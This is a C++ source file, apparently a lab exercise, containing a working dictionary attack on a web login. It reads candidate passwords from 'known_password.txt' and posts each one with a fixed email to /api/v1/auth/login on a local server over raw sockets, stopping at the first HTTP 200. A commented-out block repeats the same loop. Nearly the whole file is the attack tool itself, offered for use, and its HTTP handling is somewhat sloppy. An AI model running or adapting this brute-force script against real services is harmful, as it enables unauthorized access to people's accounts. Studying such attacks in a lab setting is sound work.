#include <iostream>
#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include <cstring>
#include <unistd.h>
#include<vector>
#include<fstream>
#include <algorithm>
#include <functional>
#include <cctype>
#include <locale>

using namespace std;

const std::string WHITESPACE = " \n\r\t\f\v";

string ltrim(const std::string &s) {
    size_t start = s.find_first_not_of(WHITESPACE);
    return (start == std::string::npos) ? "" : s.substr(start);
}

string rtrim(const std::string &s) {
    size_t end = s.find_last_not_of(WHITESPACE);
    return (end == std::string::npos) ? "" : s.substr(0, end + 1);
}

string trim(const std::string &s) {
    return rtrim(ltrim(s));
}


/**
 * Method to convert a C style string to a c++ string
 * @param a C string to be converted
 * @param Size the size of the C string
 * @return Converted C String
 */
string convert_to_string(char *a, int size) {
    string s(a);
    return s;
}

/**
 * Method to tokenize string by a delimeter
 * @param s
 * @param del
 * @return
 */
vector<string> tokenize(string s, string del = " ") {
    vector<string> tokenized_string;
    int start = 0;
    int end = s.find(del);
    while (end != -1) {
        tokenized_string.push_back(s.substr(start, end - start));
        start = end + del.size();
        end = s.find(del, start);
    }
    tokenized_string.push_back(s.substr(start, end - start));

    return tokenized_string;
}

// structure defining the HTTPmesssage
struct HTTPmessage {
    string type;
    string path;
    string http_version;
    string content_type;
    string content_length;
    string body;
    string authorization_header;

    string build_http_request_message() {
        return type + path + http_version + content_type + content_length + body;
    }
};

typedef HTTPmessage HTTPmessage;


int main() {

    int socket_desc, port_no;
    struct sockaddr_in server{}; //the server to which I want to connect to!
    string message, ip_address, pass_file, email;
    char received_message[4000];

    // Take User Input
    // cout<<"Give Port No of the website running on localhost: ";
    // cin >> port_no;

    // cout<<"Give password file name: ";
    // cin >> pass_file;

    // cout<<"Give email of the user: ";
    // cin >> email;
    port_no = 5000;
    pass_file = "known_password.txt";
    email = "monkey@gmail.com";

    //create a socket to create a TCP connection
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    ip_address = "127.0.0.1";

    //configure server
    server.sin_family = AF_INET;
    server.sin_port = htons(port_no);
    server.sin_addr.s_addr = inet_addr(ip_address.c_str());

    //connect to the remote server
    if (connect(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {
        cout << "Connection error!" << endl;
    } else {
        cout << "connected with "<<ip_address<< endl;
    }


    //now we send some data to the local server
    fstream newfile;

    newfile.open(pass_file, ios::in);
    if (newfile.is_open()) {
        string line;
        while (getline(newfile, line)) { //read data from file object and put it into string.

            string pass = trim(line);
            string text = "email=" + email + "&password=" + pass;
            string l = to_string(text.length());

            // Building HTTP request message
            HTTPmessage req;
            req.type = "POST ";
            req.path = "/api/v1/auth/login ";
            req.http_version = "HTTP/1.1\r\n";
            req.content_type = "Content-Type: application/x-www-form-urlencoded\r\n";
            req.content_length = "Content-Length: " + l;
            req.body = "\r\n\r\n" + text;
            message = req.build_http_request_message();

            cout<<"Trying password: "<<pass<<endl;

            // message =
            //         "POST /api/v1/auth/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " +
            //         l + "\r\n\r\n" + text;
            // cout<<message<<endl;

            // Trying to send data to the http server by TCP sockets
            if (send(socket_desc, message.c_str(), strlen(message.c_str()), 0) < 0) {
                cout << "Sending data failed!" << endl;
            }

            //Now we receive some data from the server that we send the data to
            if (recv(socket_desc, received_message, 2000, 0) < 0) {
                cout << "Received failed!" << endl;
            }


            // We convert the received message to a C++ string
            int received_message_size = sizeof(received_message) / sizeof(char);
            string server_message = convert_to_string(received_message, received_message_size);


            // we tokenize by newline and select the status code
            vector<string> tokenized = tokenize(server_message, "\n");

            cout<<tokenized[tokenized.size() -1]<<endl;
            tokenized = tokenize(tokenized[0], " ");
            string status = tokenized[1];

            //cout<<"The Status code is: " <<tokenized[1]<<"\n\n"<<endl;

            if (status == "200") {
                cout << "Password Found: " << pass << endl;
                cout << "\nTerminating Script" << endl;
                break;
            }


        }
        newfile.close(); //close the file object.
    }

    // for (int i = 0; i < 3; i++) {

    //     string pass = array[i];
    //     string text = "email=sasha@gmail.com&password=" + pass;
    //     string l = to_string(text.length());

    //     // Building HTTP request message
    //     request_message.set_type("POST");
    //     request_message.set_path("/api/v1/auth/login");
    //     request_message.set_http_version("HTTP/1.1");
    //     request_message.set_content_type("application/x-www-form-urlencoded");
    //     request_message.set_content_length(l);
    //     request_message.set_body(text);
    //     request_message.build_http_header();
    //     message = request_message.build_http_header();


    //     //cout << length << endl;
    //     // message =
    //     //         "POST /api/v1/auth/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " +
    //     //         l + "\r\n\r\n" + text;
    //     //cout<<message<<endl;

    //     // Trying to send data to the http server by TCP sockets
    //     if (send(socket_desc, message.c_str(), strlen(message.c_str()), 0) < 0) {
    //         cout << "Sending data failed!" << endl;
    //     } //else {
    //     //     cout << "Data send!" << endl;
    //     // }

    //     //Now we receive some data from the server that we send the data to
    //     if (recv(socket_desc, received_message, 2000, 0) < 0) {
    //         cout << "Received failed!" << endl;
    //      } //else {
    //     //     cout << "Reply received!\n" << endl;
    //     // }

    //     // We convert the received message to a C++ string
    //     int received_message_size = sizeof(received_message) / sizeof(char);
    //     string server_message = convert_to_string(received_message, received_message_size);

    //      //cout << "The server message: " << "\n" << server_message << endl;

    //     // we tokenize by newline and select the status code
    //     vector<string> tokenized = tokenize(server_message, "\n");
    //     tokenized = tokenize(tokenized[0], " ");
    //     string status = tokenized[1];

    //     cout<<"The Status code is: " <<tokenized[1]<<"\n\n"<<endl;

    //     if(status == "200"){
    //         cout<<"Password Found: "<<pass<<endl;
    //         cout<<"\nTerminating Script"<<endl;
    //         break;
    //     }


    // }

    // Finally we close the socket
    cout<<"closing connection"<<endl;
    close(socket_desc);

    return 0;
}